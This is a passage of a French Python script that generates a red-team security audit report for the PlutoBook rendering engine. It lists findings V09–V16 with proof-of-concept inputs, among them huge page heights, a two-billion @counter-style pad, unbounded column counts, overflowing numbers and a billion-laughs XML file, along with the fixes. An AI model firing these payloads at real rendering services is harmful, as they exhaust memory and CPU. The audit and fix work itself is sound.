 reconnait plus que leur propre balise fermante, donc ils ne peuvent jamais s'imbriquer eux-memes pour
 contourner la limite. XML/SVG (memes handlers expat) : profondeur reelle suivie symetriquement dans
 <code>XMLParser::handleStartElement</code>/<code>handleEndElement</code> ; <code>m_currentNode</code>
 n'avance/ne recule que tant que cette profondeur reste sous le plafond, meme logique de rattachement a
 un ancetre fixe au-dela (pas de pile de portee equivalente a <code>HTMLElementStack</code> a borner cote
 XML). Comme la profondeur du DOM resultant est ainsi bornee, les passes recursives en aval
 (<code>finishParsingDocument</code>, layout, paint, destruction <code>~Box</code>) le sont aussi sans
 compteur separe dans chacune.</p>""",
 config="""Nouvelle limite <code>EngineLimits::maxNestingDepth</code> (<code>setMaxNestingDepth</code> /
 <code>maxNestingDepth()</code>), <strong>defaut 512</strong>, <code>0</code> = illimite. API C
 <code>plutobook_set_max_nesting_depth(unsigned int)</code>. Verifie : <code>&lt;div&gt;</code>x200000
 passe de &gt;60s (timeout) a ~11s (build debug non optimise ; &lt;1s en build release) et un plafond plus
 bas (ex. 20 via un harnais de test) reste rapide sur une entree bien plus profonde, confirmant une
 complexite desormais lineaire. <em>Limite connue, hors perimetre</em> : au-dela du plafond, une table
 imbriquee tres profonde (ex. <code>&lt;table&gt;&lt;tr&gt;&lt;td&gt;</code> repete 2000 fois) ne
 crashe plus et ne boucle plus, mais peut rester tres lente -- le <em>layout</em> des tables (calcul de
 largeur intrinseque des tableaux imbriques), pas le <em>parsing</em>, a un cout deja exponentiel en
 profondeur reelle de nesting <strong>avant meme ce correctif</strong> (verifie sur la base non modifiee) ;
 non corrige ici (hors perimetre recursion/pile de V08 -- candidat pour un futur correctif dedie au
 layout de tables).""",
 status="done",
)

add(
 id="V09", slug="V09-page-count", severity="moyenne+", cat="DoS memoire + UB",
 title="Nombre de pages proportionnel a la hauteur + UB float&rarr;uint",
 keyfile="source/layout/pagebox.cpp:694-723",
 locations=[
   ("source/layout/pagebox.cpp:694-723", "pageCount = ceil(height/containerHeight), 1 PageBox par page"),
   ("source/counters.cpp:16", "conversion float->uint32_t (UB si > UINT32_MAX)"),
 ],
 nature="""<p>Le nombre de pages est <code>ceil(height / containerHeight)</code> ; une boucle construit un
 <code>PageBox</code> (+ margin boxes, jamais liberes) par page. De plus <code>ceil(hugeFloat)</code>
 depassant <code>UINT32_MAX</code> converti en <code>uint32_t</code> est un comportement indefini.</p>""",
 risk="<p><code>html{height:1e9px}</code> avec un petit <code>@page</code> &rarr; millions/milliards de pages &rarr; OOM.</p>",
 repro=["Rendre poc/repro.html en PDF &rarr; explosion du nombre de pages."],
 poc={
  "repro.html": """<!DOCTYPE html>
<html><head><meta charset="utf-8"><style>
  @page { size: 20px 20px; margin: 0; }
  html { height: 1000000000px; }
</style></head><body>x</body></html>
""",
 },
 fix="""<p>Deux gardes complementaires : (1) dans <code>PageLayout::layout()</code>
 (<code>source/layout/pagebox.cpp</code>), le resultat de <code>ceil(height/containerHeight)</code> est
 calcule en <code>double</code> et clampe a une valeur finie <code>&le; UINT32_MAX</code> avant la
 conversion vers <code>uint32_t</code> (evite l'UB si l'entree produit une hauteur/ratio astronomique) ;
 (2) le constructeur <code>Counters::Counters(Document*, uint32_t pageCount)</code>
 (<code>source/counters.cpp</code>) clampe ensuite ce compte au plafond configurable -- la boucle de
 construction des <code>PageBox</code> lit <code>counters.pageCount()</code>, donc ce seul point suffit
 a borner a la fois le nombre de pages reellement construites et le compteur <code>pages</code> expose a
 <code>counter(pages)</code> (numerotation "Page X sur Y" en marge de page).</p>
 <p><em>Limite connue, hors perimetre</em> : en verifiant ce correctif, un defaut preexistant et
 independant a ete observe dans l'ecriture PDF (bibliotheque Cairo 1.18.4) : au-dela de 65536 pages
 totales dans un meme document, le fichier PDF produit devient illisible (trailer/xref corrompu, meme
 constat sous <code>poppler</code> et <code>ghostscript</code>), reproductible aussi bien sur le code
 non modifie (a un nombre de pages controle, sans rapport avec V09) que sur ce correctif. Le defaut
 <code>maxPageCount=100000</code> ci-dessous est superieur a ce seuil : un document qui atteint reellement
 le plafond peut donc produire un PDF corrompu plutot qu'un PDF valide (mais le processus ne crashe pas et
 ne consomme pas de memoire non bornee -- l'objectif memoire/UB de V09 est atteint). Corriger l'ecriture
 PDF elle-meme est hors perimetre de V09 (bug distinct, cote serialisation Cairo/PDF, pas
 pagination/conversion) -- candidat pour un futur correctif dedie.</p>""",
 config="Plafond configurable via <code>EngineLimits::setMaxPageCount</code> (defaut 100000 pages, <code>0</code> = illimite -- non recommande) ; API C <code>plutobook_set_max_page_count</code>.",
 status="done",
)

add(
 id="V10", slug="V10-counter-pad", severity="moyenne+", cat="DoS memoire",
 title="@counter-style pad / additive : chaine multi-Go",
 keyfile="source/cssrule.cpp:855-878",
 locations=[
   ("source/cssparser.cpp:4711-4724", "consumeCounterStylePad accepte un entier non borne"),
   ("source/cssrule.cpp:855-878", "boucle representation += padSymbol"),
   ("source/cssrule.cpp:766-768", "variante additive: repetitions = value / weight"),
 ],
 nature="""<p><code>pad: 2000000000 "x"</code> fait boucler <code>representation += padSymbol</code> jusqu'a
 ~2 milliards de fois ; la chaine est ensuite recopiee dans le Heap. Variante additive analogue via
 <code>counter-increment</code> non borne et <code>additive-symbols: 1 "x"</code>.</p>""",
 risk="<p><strong>Impact</strong> : chaine ~Go &rarr; OOM.</p>",
 repro=["Rendre poc/repro.html &rarr; construction d'une chaine geante."],
 poc={
  "repro.html": """<!DOCTYPE html>
<html><head><meta charset="utf-8"><style>
  @counter-style boom { system: numeric; symbols: "0" "1"; pad: 2000000000 "x"; }
  li { list-style: boom; }
</style></head><body><ol><li>a</li></ol></body></html>
""",
 },
 fix="""<p>Les deux boucles de generation (<code>CSSCounterStyle::generateRepresentation</code> pour
 <code>pad</code>, <code>CSSCounterStyle::generateInitialRepresentation</code> pour le systeme
 <code>additive</code>) s'arretent d'ajouter des symboles a la representation en construction des
 qu'elle atteint <code>EngineLimits::maxCounterLength()</code>, plutot que de continuer jusqu'a la
 valeur brute (potentiellement ~2 milliards) demandee par le CSS. Pour la branche additive, la
 soustraction <code>value -= repetitions * weight</code> reste effectuee en entier sur la valeur
 complete (cout O(1), pas de memoire) afin que l'algorithme "representation exacte ou echec" du
 systeme additif continue de fonctionner correctement ; seule la croissance de la chaine est
 plafonnee.</p>""",
 config="""Nouvelle limite <code>EngineLimits::maxCounterLength</code> (<code>setMaxCounterLength</code> /
 <code>maxCounterLength()</code>), <strong>defaut 100000</strong> caracteres, <code>0</code> = illimite
 (non recommande). API C <code>plutobook_set_max_counter_length(unsigned int)</code>. Verifie :
 <code>pad: 2000000000 "x"</code> et une variante additive (<code>additive-symbols: 1 "x"</code> +
 <code>counter-increment</code> de 2 milliards) produisent chacun une representation bornee a
 exactement 100000/100001 caracteres (mesure directe) au lieu de ~2 milliards, rendu en &lt;0.15s au
 lieu d'un OOM ; un plafond abaisse via un harnais de test (ex. 5/10/50) reborne la representation en
 conséquence.""",
 status="done",
)

add(
 id="V11", slug="V11-stb-stride", severity="moyenne", cat="Lecture hors-limites",
 title="Over-read stb&rarr;cairo (mauvais stride source)",
 keyfile="source/resource/imageresource.cpp:169-190",
 locations=[
   ("source/resource/imageresource.cpp:175", "src = imageData + surfaceStride*y (imageData est packe width*4)"),
 ],
 nature="""<p><code>imageData</code> renvoye par stb est packe (<code>width*4</code> octets/ligne) mais indexe
 avec le <em>stride de cairo</em>. Si cairo padde le stride au-dela de <code>width*4</code> (alignement
 SIMD), les lignes <code>y&gt;0</code> lisent hors du buffer stb.</p>""",
 risk="""<p><strong>Impact</strong> : heap over-read (fuite d'info dans le rendu / crash). Latent sur le
 build cairo Linux courant ou <code>stride == width*4</code> pour ARGB32 ; actif sous cairo a stride
 aligne.</p>""",
 repro=["Rendre une image passant par stb (ex. BMP/GIF) de largeur telle que width*4 n'est pas multiple de l'alignement cairo, sous un build cairo a stride aligne."],
 poc={
  "make-bmp.py": """#!/usr/bin/env python3
# Petit BMP 24 bits de largeur 'impaire' pour la voie stb.
import struct
W, H = 13, 4
row = (b"\\x10\\x20\\x30")*W
pad = (-len(row)) % 4
data = b"".join(row + b"\\x00"*pad for _ in range(H))
off = 54
bmp = b"BM" + struct.pack("<IHHI", off+len(data), 0, 0, off)
bmp += struct.pack("<IiiHHIIiiII", 40, W, H, 1, 24, 0, len(data), 2835, 2835, 0, 0)
open("odd.bmp","wb").write(bmp + data)
print("odd.bmp ecrit")
""",
 },
 fix="""<p>Nouvelle variable <code>imageStride = width * 4</code> (stb produit toujours 4 octets/pixel via
 <code>STBI_rgb_alpha</code>, sans padding) utilisee pour avancer <code>src</code> ligne par ligne ;
 <code>dst</code> continue d'avancer avec <code>surfaceStride</code> (le stride reel, potentiellement
 padde, du buffer cairo). La logique de premultiplication alpha est inchangee.</p>""",
 config="""<p>Correctif pur (pas de knob).</p>
 <p><em>Verification</em> : rejoue sous ASan (<code>meson setup build-asan -Db_sanitize=address</code>) avec
 des BMP/GIF de largeurs variees (1 a 257px, y compris non multiples de 4/16/32) passant par la voie stb
 &mdash; aucune erreur, rendu correct (pixels non-transparents attendus presents). Sur ce systeme, la
 fonction cairo <code>cairo_format_stride_for_width(ARGB32, w)</code> renvoie toujours exactement
 <code>w*4</code> (verifie pour w=1..20) : le stride n'est jamais padde, donc le bug reste <strong>latent</strong>
 sur ce build precis et ASan ne peut pas declencher l'over-read via le pipeline complet ici. La logique du
 correctif a ete verifiee independamment par un harnais isole reproduisant exactement le motif d'indexation
 (buffer stb packe de taille exacte + stride "cairo" simule artificiellement plus grand que <code>width*4</code>) :
 la version non corrigee (indexation de <code>src</code> par le stride agrandi) declenche un
 <code>heap-buffer-overflow</code> ASan net en lecture pile a la frontiere du buffer packe ; la version
 corrigee (indexation par <code>imageStride</code>) s'execute sans erreur. Ceci confirme que le correctif
 est correct pour tout build cairo qui padderait effectivement le stride ARGB32 au-dela de <code>width*4</code>.</p>""",
 status="done",
)

add(
 id="V12", slug="V12-column-count", severity="moyenne", cat="DoS CPU",
 title="column-count non borne : boucle multi-milliards",
 keyfile="source/layout/multicolumnbox.cpp:304-313",
 locations=[
   ("source/cssparser.cpp:1479-1486", "consumePositiveInteger: min 1, pas de max"),
   ("source/layout/multicolumnbox.cpp:304-313", "boucle O(runs) par iteration"),
 ],
 nature="<p><code>columns:2000000000</code> declenche une boucle <code>O(runs)</code> par iteration sur des milliards d'iterations.</p>",
 risk="<p><strong>Impact</strong> : hang CPU (DoS). Pas d'allocation par colonne sur ce chemin.</p>",
 repro=["Rendre poc/repro.html &rarr; boucle interminable."],
 poc={
  "repro.html": """<!DOCTYPE html>
<html><head><meta charset="utf-8"><style>
  div { columns: 2000000000; }
</style></head><body><div>a b c d e</div></body></html>
""",
 },
 fix="""<p><code>BoxStyle::columnCount()</code> (le seul point de conversion de la valeur CSS
 <code>column-count</code> en entier utilise par le layout multi-colonnes, appele depuis
 <code>MultiColumnFlowBox::computeWidth</code> et <code>computePreferredWidths</code>) clampe la valeur
 analysee a <code>EngineLimits::maxColumnCount()</code> avant de la renvoyer, plutot que de la laisser
 telle quelle (potentiellement ~2 milliards). Le minimum de 1 deja garanti par
 <code>consumePositiveInteger</code> (partage avec <code>widows</code>/<code>orphans</code>, donc non
 touche) reste inchange. La boucle <code>O(runs)</code> de
 <code>MultiColumnRowBox::distributeImplicitBreaks</code> ne peut alors plus depasser ce plafond
 d'iterations.</p>""",
 config="""Nouvelle limite <code>EngineLimits::maxColumnCount</code> (<code>setMaxColumnCount</code> /
 <code>maxColumnCount()</code>), <strong>defaut 1000</strong>, <code>0</code> = illimite (non
 recommande). API C <code>plutobook_set_max_column_count(unsigned int)</code>. Verifie :
 <code>columns:2000000000</code> passe d'un hang (&gt;8s, tue par timeout, aucun PDF valide) a un rendu
 en ~0.05s (PDF valide) une fois le plafond applique ; <code>columns:3</code> sur un bloc de texte
 produit toujours un rendu 3 colonnes correct (non-regression) ; un plafond abaisse via un harnais de
 test (C API, ex. maxColumnCount=1/5) reduit d'autant le nombre de colonnes reellement utilisees,
 mesure indirectement par le nombre de pages produites pour un meme contenu.""",
 status="done",
)

add(
 id="V13", slug="V13-integer-ub", severity="basse", cat="UB / robustesse",
 title="Overflow entier dans le parsing numerique",
 keyfile="source/htmldocument.cpp:224",
 locations=[
   ("source/htmldocument.cpp:224-233", "output = output*10 + digit (UB signe pour <li value>/<ol start>)"),
   ("source/csstokenizer.cpp:289", "exposant int: 1e99999999"),
   ("source/svgproperty.cpp:130", "exposant int SVG"),
   ("source/htmlentityparser.cpp:2479-2510", "reference numerique &#... (clampee a U+FFFD, memory-safe)"),
 ],
 nature="<p>Accumulation <code>output = output*10 + digit</code> sans cap : UB signe pour les attributs signes, wrap non signe ailleurs ; exposants <code>int</code> overflowables. Les references de caracteres sont clampees a U+FFFD (donc memory-safe).</p>",
 risk="<p><strong>Impact</strong> : UB / valeurs absurdes ; contribue a V06/V09. Faible severite intrinseque.</p>",
 repro=["Rendre poc/repro.html (valeurs numeriques enormes)."],
 poc={
  "repro.html": """<!DOCTYPE html>
<html><head><meta charset="utf-8"></head>
<body>
  <ol start="9999999999999999999"><li>a</li></ol>
  <p>&#99999999999999999999;</p>
</body></html>
""",
 },
 fix="<p>Accumulation verifiee + clamp de plage.</p>",
 config="Correctif de robustesse (pas de knob dedie).",
)

add(
 id="V14", slug="V14-decoder-returns", severity="basse", cat="Robustesse",
 title="Retours turbojpeg/webp non verifies + malloc non teste",
 keyfile="source/resource/imageresource.cpp:110-123",
 locations=[
   ("source/resource/imageresource.cpp:115", "tjDecompress2 retour ignore"),
   ("source/resource/imageresource.cpp:118-119", "std::malloc non teste avant memcpy"),
 ],
 nature="<p>Le retour de <code>tjDecompress2</code> est ignore et le <code>std::malloc</code> du blob JPEG conserve n'est pas teste avant <code>memcpy</code>.</p>",
 risk="<p><strong>Impact</strong> : crash/DoS sur echec d'allocation (amplifie par V04).</p>",
 repro=["Fournir un JPEG malforme/enorme et observer le chemin non verifie (sous ASan)."],
 poc={
  "note.md": "Reproduction fiable via un JPEG tronque + build ASan. Voir V05 pour un generateur d'image volumineuse.\n",
 },
 fix="<p>Verifier tous les retours de decodeur et le <code>malloc</code> avant usage.</p>",
 config="Correctif de robustesse.",
)

add(
 id="V15", slug="V15-assert-bounds", severity="basse", cat="Robustesse (latent)",
 title="Bornes/downcasts valides uniquement par assert",
 keyfile="source/csstokenizer.h:239-286",
 locations=[
   ("source/csstokenizer.h:239-286", "CSSTokenizerInputStream: bornes en assert seulement"),
   ("source/pointer.h:227-236", "to<T>() : assert(is<T>()) puis static_cast"),
   ("source/layout/tablebox.h:278,288", "casts structurels supposant l'invariant d'arbre"),
 ],
 nature="<p>Sous <code>NDEBUG</code> (release), les <code>assert</code> disparaissent : le drift de <code>m_offset</code> et les downcasts <code>to&lt;T&gt;()</code> deviennent des <code>static_cast</code> non verifies. Aucun bug prouve, mais primitive a fuzzer (type confusion sur les casts de table).</p>",
 risk="<p><strong>Impact potentiel</strong> : type confusion &rarr; corruption memoire si un chemin de fixup laisse un enfant non conforme.</p>",
 repro=["Fuzzer l'entree publique sous ASan/UBSan avec des arbres de table malformes (V06/V07)."],
 poc={
  "note.md": "Cible de fuzzing prioritaire. Construire un harnais libFuzzer sur l'entree publique (loadHtml) sous ASan/UBSan.\n",
 },
 fix="<p>Remplacer les <code>assert</code> de bornes des chemins chauds par des verifications actives en release ; renforcer les downcasts.</p>",
 config="Correctif de robustesse.",
)

add(
 id="V16", slug="V16-expat-billion-laughs", severity="info", cat="Info / dependance",
 title="Billion-laughs XML dependant de la version d'expat",
 keyfile="meson.build:8-11",
 locations=[
   ("meson.build:8-11", "dependency('expat', fallback: ...) prefere l'expat systeme"),
   ("source/xmlparser.cpp:45-64", "aucun handler d'entite externe (XXE non atteignable)"),
 ],
 nature="""<p><strong>Bonne nouvelle</strong> : aucun <code>XML_SetExternalEntityRefHandler</code> ni
 <code>XML_SetParamEntityParsing</code> &rarr; <em>XXE non atteignable</em>. Mais <code>meson.build</code>
 prefere l'expat <em>systeme</em> ; la protection billion-laughs (expansion d'entites internes) depend
 donc de la version (protegee par defaut a partir d'expat 2.4.0 ; le fallback bundle 2.7.3 l'est).</p>""",
 risk="<p><strong>Impact</strong> : DoS memoire par expansion d'entites si l'hote fournit un expat &lt; 2.4.0.</p>",
 repro=["Rendre poc/lol.xml avec un expat < 2.4.0."],
 poc={
  "lol.xml": """<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<lolz>&lol4;</lolz>
""",
 },
 fix="<p>Epingler/verifier expat &ge; 2.4.0, ou fixer explicitement <code>XML_SetBillionLaughsAttackProtectionMaximumAmplification</code>.</p>",
 config="Version minimale d'expat imposee dans le build.",
)

# ---------------------------------------------------------------------------
# Rendu HTML
# ---------------------------------------------------------------------------
CSS = """/* Rapport d'audit securite PlutoBook - feuille de style commune */
:root{--bg:#fff;--fg:#1a1a1a;--muted:#666;--card:#f6f7f9;--border:#e2e5ea;--code:#f0f2f5;
  --link:#0b62d6;--crit:#c62828;--high:#e65100;--medhigh:#ef6c00;--med:#f9a825;--low:#1565c0;--info:#607d8b;}
@media (prefers-color-scheme:dark){:root{--bg:#14171c;--fg:#e6e8eb;--muted:#9aa4b0;--card:#1b1f26;
  --border:#2a2f38;--code:#0f1319;--link:#5aa0ff;}}
:root[data-theme=dark]{--bg:#14171c;--fg:#e6e8eb;--muted:#9aa4b0;--card:#1b1f26;--border:#2a2f38;--code:#0f1319;--link:#5aa0ff;}
:root[data-theme=light]{--bg:#fff;--fg:#1a1a1a;--muted:#666;--card:#f6f7f9;--border:#e2e5ea;--code:#f0f2f5;--link:#0b62d6;}
*{box-sizing:border-box}
body{margin:0;background:var(--bg);color:var(--fg);
  font:16px/1.6 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;}
.wrap{max-width:960px;margin:0 auto;padding:2rem 1.25rem 4rem}
h1{font-size:1.9rem;margin:.2rem 0 .4rem}h2{font-size:1.3rem;margin:2rem 0 .6rem;border-bottom:1px solid var(--border);padding-bottom:.3rem}
h3{font-size:1.05rem;margin:1.4rem 0 .4rem}
a{color:var(--link)}code{background:var(--code);padding:.1em .35em;border-radius:4px;font-size:.9em;
  font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
pre{background:var(--code);border:1px solid var(--border);border-radius:8px;padding:.9rem 1rem;overflow-x:auto}
pre code{background:none;padding:0}
.muted{color:var(--muted)}
.lead{color:var(--muted);font-size:1.05rem}
table{border-collapse:collapse;width:100%;margin:1rem 0;font-size:.94rem;display:block;overflow-x:auto}
th,td{border:1px solid var(--border);padding:.5rem .6rem;text-align:left;vertical-align:top}
th{background:var(--card)}
tr:hover td{background:var(--card)}
.badge{display:inline-block;padding:.12em .6em;border-radius:999px;color:#fff;font-size:.78rem;font-weight:600;white-space:nowrap}
.sev-crit{background:var(--crit)}.sev-high{background:var(--high)}.sev-medhigh{background:var(--medhigh)}
.sev-med{background:var(--med);color:#222}.sev-low{background:var(--low)}.sev-info{background:var(--info)}
.card{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:1rem 1.2rem;margin:1rem 0}
.kv{margin:.2rem 0}.kv b{display:inline-block;min-width:130px;color:var(--muted);font-weight:600}
.crumb{font-size:.9rem;margin-bottom:1rem}
.status-todo{color:var(--high);font-weight:600}.status-done{color:#2e7d32;font-weight:600}
ol.steps li{margin:.3rem 0}
footer{margin-top:3rem;color:var(--muted);font-size:.85rem;border-top:1px solid var(--border);padding-top:1rem}
.toggle{float:right;font-size:.8rem;border:1px solid var(--border);border-radius:6px;padding:.2rem .5rem;cursor:pointer;background:var(--card);color:var(--fg)}
"""

THEME_JS = """<script>
(function(){var t=localStorage.getItem('pb-theme');if(t)document.documentElement.setAttribute('data-theme',t);
document.addEventListener('DOMContentLoaded',function(){var b=document.getElementById('tg');if(!b)return;
b.onclick=function(){var d=document.documentElement,c=d.getAttribute('data-theme')==='dark'?'light':'dark';
d.setAttribute('data-theme',c);localStorage.setItem('pb-theme',c);};});})();
</script>"""

def page(title, body, css_path="assets/style.css"):
    title_txt = html.escape(html.unescape(title), quote=True)
    return f"""<!DOCTYPE html>
<html lang="fr"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>{title_txt}</title>
<link rel="stylesheet" href="{css_path}">
{THEME_JS}
</head><body><div class="wrap">
<button class="toggle" id="tg">theme</button>
{body}
<footer>PlutoBook &mdash; audit de securite red-team. Rapport statique genere pour lecture humaine.
Modele de menace : input non fiable (rendu serveur de HTML/SVG/CSS arbitraire).</footer>
</div></body></html>
"""

# --- Root index ---
rows = ""
for f in F:
    label, cls = SEV[f["severity"]]
    rows += f"""<tr>
<td><a href="{f['slug']}/">{f['id']}</a></td>
<td><a href="{f['slug']}/">{f['title']}</a></td>
<td><span class="badge {cls}">{label}</span></td>
<td>{esc(f['cat'])}</td>
<td><code>{esc(f['keyfile'])}</code></td>
<td>{status_html(f)}</td>
</tr>\n"""

counts = {}
for f in F: counts[f["severity"]] = counts.get(f["severity"],0)+1
summary = " &middot; ".join(f'<span class="badge {SEV[s][1]}">{counts[s]} {SEV[s][0]}</span>'
                            for s in ["critique","haute","moyenne+","moyenne","basse","info"] if s in counts)

root_body = f"""<h1>PlutoBook &mdash; Rapport d'audit de securite</h1>
<p class="lead">Audit red-team du moteur de rendu HTML/XML/CSS/SVG &rarr; PDF. {len(F)} problemes,
classes par criticite.</p>
<p>{summary}</p>

<div class="card">
<h3 style="margin-top:0">Resume executif</h3>
<p>PlutoBook est robuste sur les bugs memoire directs des parseurs (buffers <code>std::string</code>/<code>vector</code>,
lookahead borne) et bien protege contre XXE. Mais il a ete concu pour de l'<em>input de confiance</em> alors que
son usage promu est le rendu serveur de HTML arbitraire. Sous ce modele de menace, il manque toute
<strong>couche de politique de securite</strong> (allowlist de schema, filtrage d'adresse, validation d'URL)
et tout <strong>budget</strong> (taille, profondeur, pixels, compte) dans le pipeline parse &rarr; layout.</p>
<p><strong>Amplificateur transversal</strong> : le Heap PMR a un <code>operator delete</code> no-op
(<code>heapstring.h:88</code>) &mdash; rien n'est libere avant la fin du rendu, donc chaque OOM ci-dessous
est non recuperable.</p>
</div>

<h2>Problemes (par criticite)</h2>
<table>
<thead><tr><th>ID</th><th>Titre</th><th>Severite</th><th>Classe</th><th>Fichier cle</th><th>Statut</th></tr></thead>
<tbody>
{rows}</tbody>
</table>

<h2>Legende de severite</h2>
<p>
<span class="badge sev-crit">Critique</span> exploitation directe (SSRF, lecture de fichiers) &mdash;
<span class="badge sev-high">Haute</span> DoS fiable / surface RCE &mdash;
<span class="badge sev-medhigh">Moyenne+</span> DoS + UB &mdash;
<span class="badge sev-med">Moyenne</span> over-read latent / DoS CPU &mdash;
<span class="badge sev-low">Basse</span> UB / robustesse &mdash;
<span class="badge sev-info">Info</span> dependance / posture.
</p>
<p class="muted">Voir aussi <code>FIX-GUIDE.md</code> (guide d'implementation des correctifs) et
<code>PROGRESS.md</code> (journal de progression).</p>
"""

(ROOT / "assets").mkdir(parents=True, exist_ok=True)
(ROOT / "assets" / "style.css").write_text(CSS)
(ROOT / "index.html").write_text(page("PlutoBook - Audit de securite", root_body))

# --- Finding pages + PoCs ---
for f in F:
    label, cls = SEV[f["severity"]]
    locs = "".join(f"<li><code>{esc(l)}</code> &mdash; {esc(d)}</li>" for l,d in f["locations"])
    steps = "".join(f"<li>{s}</li>" for s in f["repro"])
    pocfiles = ""
    for fn in f["poc"]:
        pocfiles += f'<li><code>poc/{esc(fn)}</code></li>'
    body = f"""<div class="crumb"><a href="../">&larr; Tous les problemes</a></div>
<h1>{f['id']} &middot; {f['title']}</h1>
<p><span class="badge {cls}">{label}</span> &nbsp; <span class="muted">{esc(f['cat'])}</span></p>
<div class="card">
<div class="kv"><b>Statut</b> {status_html(f)}</div>
<div class="kv"><b>Fichier cle</b> <code>{esc(f['keyfile'])}</code></div>
</div>

<h2>Nature</h2>
{f['nature']}

<h2>Localisation</h2>
<ul>{locs}</ul>

<h2>Risque &amp; impact</h2>
{f['risk']}

<h2>Reproduction</h2>
<ol class="steps">{steps}</ol>
<p class="muted">Fichiers d'exemple :</p>
<ul>{pocfiles}</ul>

<h2>Correctif propose</h2>
{f['fix']}

<h2>Configuration (defaut + configurable)</h2>
<p>{f['config']}</p>
"""
    d = ROOT / f["slug"]
    (d / "index.html").write_text(page(f"{f['id']} - {f['title']}", body, css_path="../assets/style.css"))
    pdir = d / "poc"; pdir.mkdir(parents=True, exist_ok=True)
    for fn, content in f["poc"].items():
        (pdir / fn).write_text(content)

print(f"Genere: {len(F)} findings + index + css")
for f in F: print(" ", f["id"], f["slug"], f["severity"])
